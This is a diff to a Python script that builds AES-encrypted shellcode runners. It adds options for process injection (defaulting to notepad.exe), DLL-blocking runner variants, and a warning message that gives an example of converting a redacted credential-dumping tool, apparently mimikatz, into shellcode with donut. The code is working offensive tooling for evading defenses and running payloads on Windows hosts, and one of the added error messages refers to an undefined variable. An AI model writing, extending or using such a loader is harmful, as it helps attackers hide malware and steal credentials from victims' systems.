@@ -5,6 +5,15 @@ from Crypto.Util.Padding import pad
 from Crypto.Random import get_random_bytes
 from ctypes import *
 
+WARNING_MSG = """
+###############################################################################
+#                                                                             #
+#  Large binaries should use either the runner_big or runner_big_DLL options  #
+#  or you will wait a LONG time for decryption. The runners _big will run     #
+#  say, donut [redacted]katz.exe -o mimi.bin -p coffee, in about a min        #
+#                                                                             #
+###############################################################################
+"""
 
 TEMPLATE = """
 #define X64PROC "%s"
@@ -36,7 +45,19 @@ def format_shellcode(shellcode):
 verbose = False
 parser = argparse.ArgumentParser(description="generate AES-CBC encrypted shellcode runners")
 parser.add_argument('-inbin', type=str, help=".bin file")
-parser.add_argument('-execmethod', type=str, choices=['section_inject', 'section_runner', 'section_runner_dll', 'runner', 'runner_dll', 'runner_big'], default="runner")
+parser.add_argument('-execmethod', type=str, choices=[
+    'section_inject', 
+    'section_runner', 
+    'section_runner_dll', 
+    'section_runner_big', 
+    'section_runner_big_dll', 
+    'runner', 
+    'runner_dll', 
+    'runner_big_blockddls', 
+    'runner_big_blockddls_dll', 
+    'runner_blockdlls', 
+    'runner_blockdlls_dll'], 
+    default="runner_dll")
 parser.add_argument('--process', type=str, help="process to inject (only with \'section_inject\')", default="notepad.exe", required=False)
 parser.add_argument('--cmdline', type=str, default="notepad", help="cmdline argument to show (only with \'section_inject\')", required=False)
 parser.add_argument('--verbose', default=False, action='store_true', dest='verbose')
@@ -69,6 +90,7 @@ encrypted_data = cipher.encrypt(pad(data, AES.block_size))
 
 payload_hash = res
 e_len = len(encrypted_data)
+if e_len >= 1000000: print(WARNING_MSG)
 og_len = data_len.value
 hex_iv = format_shellcode(iv)
 hex_k = format_shellcode(key)
@@ -89,9 +111,15 @@ with open("new_config.h", "w") as f:
 
 # make the binary
 if args.verbose:
-    print("[*] Printing new_config.h\n\n")
+    print("\n\n\n[*] Printing new_config.h\n\n")
     print(config_h)
-    print("[+] compiling . . .")
+    print("\n\n[+] compiling . . .")
+    files_before = len(os.listdir("./"))
     os.system(f"make {exec_method}")
+    if len(os.listdir("./")) > files_before: print("[*] successfull!") # yup, this is the check
+    else: print(f"\n[!] failed. Run \"make {execmethod}\" to see the errors")
 else:
+    files_before = len(os.listdir("./"))
     os.system(f"make {exec_method} 1>/dev/null 2>&1")
+    if len(os.listdir("./")) > files_before: pass 
+    else: print(f"\n[!] failed. Run \"make {execmethod}\" to see the errors")
